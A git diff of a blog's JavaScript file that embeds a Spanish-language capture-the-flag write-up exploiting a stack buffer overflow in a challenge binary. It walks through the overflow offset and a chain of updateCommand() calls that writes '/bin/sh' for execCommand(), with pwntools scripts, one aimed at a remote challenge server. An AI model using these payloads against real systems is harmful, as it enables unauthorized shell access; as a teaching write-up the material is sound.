2d7e4de6d94de115f3a3c976ece1922fdc11f3b4
Joshua Aviles <122099216+JJoosh@users.noreply.github.com>
2024-10-14 23:19:20 -0600

    Update blog.js

--- js/blog.js
+++ js/blog.js
@@ -59,31 +59,27 @@ document.addEventListener('DOMContentLoaded', function () {
             content: `
                 <h2>Server C2 Exploit Writeup</h2>
 
-                <p><strong>1. Comando principal:</strong></p>
-                <p>El análisis del servidor comenzó obteniendo el binario responsable de ejecutar el servidor C2. Este binario fue descompilado utilizando <code>Ghidra</code>...</p>
+                <p>La función main() del binario ejecuta un bucle, este se ejecuta n veces que es la longitud de la string "echo Datos exfiltrados", en cada iteración llama a la función updateCommand() pasandole como primer argumnto el valor del iterador que va de 0 hasta la longitud de la string y como segundo argumento la letra de la string en esa posición por lo que si el iterador es 0 le pasará la letra "e", si el iterador es 1 le pasará la letra "c"</p>
+                <img src="https://github.com/user-attachments/assets/0fdb5319-e59a-49a9-920b-23be1a66060a" alt="Command Execution Diagram" />
 
-                <p><strong>2. Análisis inicial:</strong></p>
-                <p>El primer paso fue identificar que el binario ejecutaba un bucle en el que esperaba comandos del cliente...</p>
+                <p>La función updateCommand() simplemente se encarga de mover a el símbolo llamado command mas la posición el valor que recibe como segundo argumento, si el iterador es 0 movera a command + 0 la letra "e", si el iterador es 1, movera a command + 1 la letra "c"</p>
+                <img src="https://github.com/user-attachments/assets/5b4575ea-a59d-409a-a14f-eaa2fad4be2e" />
 
-                <p><strong>3. Función main()</strong></p>
-                <p>La función <code>main()</code> del binario ejecuta un bucle n veces según la longitud de la string <code>"echo Datos exfiltrados"</code>...</p>
+                <p>Luego tenemos que llama a la función vuln(), esta declara un buffer y recibe con fgets 0x200 bytes o 512 en decimal</p>
+                <img src="https://github.com/user-attachments/assets/057fca7c-7102-4273-905d-6732bf0461a2" alt="Execution Screenshot" />
 
-                <p><strong>4. Función updateCommand()</strong></p>
-                <p>La función <code>updateCommand()</code> se encarga de mover el puntero del buffer...</p>
-                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295430734458257509/image.png" alt="Command Execution Diagram" />
+                <p>Sin embargo el buffer esta en esp - 0x10c o esp - 268</p>
+                <img src="https://github.com/user-attachments/assets/dfcf4f05-199e-42f2-9ddb-1adeb691967d" />
+                <p>por lo que después de enviar 268 bytes empezariamos a sobrescribir datos en el stack</p>
 
-                <p><strong>5. Explotación de vulnerabilidad</strong></p>
-                <p>El problema identificado se encuentra en cómo se manejan los punteros en el buffer de comandos...</p>
-                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295431235232993352/image.png" alt="Execution Screenshot" />
+                <p>Finalmente main() llama a la función execCommand() que solo se encarga de ejecutar con system() el simbolo command rellenado anteriormente letra por letra usando updateCommand()</p>
+                <img src="https://github.com/user-attachments/assets/80d14425-3bfb-43e8-9b01-71605e4263c6" />
 
-                <p><strong>6. Vulnerabilidad del Buffer</strong></p>
-                <p>Luego tenemos que la función <code>vuln()</code> declara un buffer y recibe con <code>fgets</code> 0x200 bytes...</p>
-                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295432051033509908/image.png" alt="Buffer Overflow" />
 
-                <p><strong>7. Ejecución Remota</strong></p>
-                <p>Finalmente, <code>main()</code> llama a la función <code>execCommand()</code>...</p>
+
 
                 <h3>Exploitation Script</h3>
+                <p>Ya que conocemos el offset podemos simplemente pasar esos bytes y sobrescribir un dword en el esp</p>
                 <div class="code-block">
                     <pre><code>
 #!/usr/bin/python3
@@ -106,12 +102,80 @@ shell.interactive()
                     <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                 </div>
 
-                <h3>Final Exploit Execution</h3>
-                <p>Una vez completado, modificamos la string del simbolo <code>command</code> a <code>/bin/sh</code>...</p>
-                <img src="https://media.discordapp.net/attachments/1295243938160054332/1295497878894149642/image.png" alt="Shell Execution" />
+                <p>De esta forma sobrescribimos el return address y obtenemos control sobre el flujo </p>
+                <img src="https://github.com/user-attachments/assets/395bf669-98af-4863-b938-eda27672b172" alt="Shell Execution" />
 
-                <p>Finalmente ejecutamos el siguiente script de manera remota:</p>
+                <p>Técnica: nuestra idea sera aprovechar que con updateCommand() podemos modificar un byte del simbolo command pasandole la posición y un valor, para posteriormente llamar a execCommand() y ejecutar dicho comando</p>
                 <div class="code-block">
+                    <pre><code>
+from pwn import *
+
+shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")
+
+offset = 268
+junk = b"A" * offset
+
+payload  = b""
+payload += junk
+
+payload += p32(0x080491f3) # updateCommand()
+payload += p32(0x42424242) # return address
+payload += p32(0)          # position
+payload += p32(u8(b"/"))   # byte to write
+
+shell.sendline(payload)
+shell.recvlines(2)
+
+shell.interactive()
+                    </code></pre>
+                    <p>Iniciamos intentando escribir un solo byte, en este caso al inicio de la llamada de updateCommand el primer valor en el stack será la dirección donde volverá una vez termine la llamada y los siguientes 2 valores son los argumentos en este paso le pasamos como argumento la posición 0 del simbolo command y como valor a escribir el byte 0x2f o /</p>
+                    <img src="https://github.com/user-attachments/assets/16b1bb7e-ea60-4460-abe7-d920eeb7c256" alt="Shell Execution" />
+
+                    <p>Una vez continuamos con la ejecución de updateCommand(0, "/") en el simbolo command se escribe el caracter "/" y vuelve a la direccion de retorno que pasamos al inicio</p>
+                    <img src="https://github.com/user-attachments/assets/87574376-ef26-4268-b812-4a04cb0e1d70" alt="Shell Execution" />
+                    <p>Ahora bien, necesitamos repetir este proceso y seguir con ese convenio de llamadas, para evitar que lo anterior limpiaremos los argumentos antes usados que son 2 dwords u 8 bytes, sin embargo no encontramos un gadget que limpie 8 sino uno que limpia 12 por lo que tendremos que pasar 4 bytes mas de padding</p>
+                    <img src="https://github.com/user-attachments/assets/3d03a612-1dd9-44b4-83f5-a0e05a564dff" alt="Shell Execution" />
+
+                    <p>El exploit mediante un bucle for pasa como primer argumento que es la posición el iterador de 0 a 7 y le pasa a su vez el valor que esta en esa posición de la string cmd, como valor de retorno usamos el stack pivot para limpiar la pila y vuelva a ejecutar la siguiente función</p>
+                    <img src="https://github.com/user-attachments/assets/4649f48b-3de9-4a4a-b925-ad9c7781ba65" alt="Shell Execution" />
+
+                                    <div class="code-block">
+                    <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+shell = gdb.debug("./chal", "b *0x080491f3\ncontinue")
+
+offset = 268
+junk = b"A" * offset
+
+cmd = b"/bin/sh\x00"
+
+payload  = b""
+payload += junk
+
+for i in range(len(cmd)):
+    payload += p32(0x080491f3)     # updateCommand()
+    payload += p32(0x0804901b)     # add esp, 8; pop ebx; ret;
+    payload += p32(i)              # position
+    payload += p32(u8(cmd[i:i+1])) # byte to write
+    payload += p32(0x41414141)     # padding
+
+payload += p32(0x0804921d)         # execCommand()
+
+shell.sendline(payload)
+shell.recvlines(2)
+
+shell.interactive()
+                    </code></pre>
+                    <p>Al terminar la ejecución de la primera llamada a la función limpia 2 bytes como se muestra en la imagen y retorna a la función updateCommand del siguiente valor</p>
+                    <img src="https://github.com/user-attachments/assets/d16b5826-5157-4805-8766-2c81c327f047" alt="Shell Execution" />
+
+                    
+                    <p>En la ultima llamada a execCommand ya hemos modificado la string del simbolo command a /bin/sh por lo que al ejecutarlo con system obtenemos una shell</p>
+                    <img src="https://github.com/user-attachments/assets/d16b5826-5157-4805-8766-2c81c327f047" alt="Shell Execution" /> 
+                    <p>Finalmente solo nos queda ejecutarlo remotamente y obtener acceso</p>
+                                                        <div class="code-block">
                     <pre><code>
 #!/usr/bin/python3
 from pwn import remote, p32, u8
@@ -121,7 +185,7 @@ shell = remote("35.95.31.64", 3000)
 offset = 268
 junk = b"A" * offset
 
-cmd = b"/bin/sh\\x00"
+cmd = b"/bin/sh\x00"
 
 payload  = b""
 payload += junk
@@ -140,6 +204,10 @@ shell.recvlines(2)
 
 shell.interactive()
                     </code></pre>
+                    <img src="https://github.com/user-attachments/assets/c646b120-9a12-4069-bbf3-b06104c72eb9" alt="Shell Execution" /> 
+                    
+
+                      
                     <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
                 </div>
             `
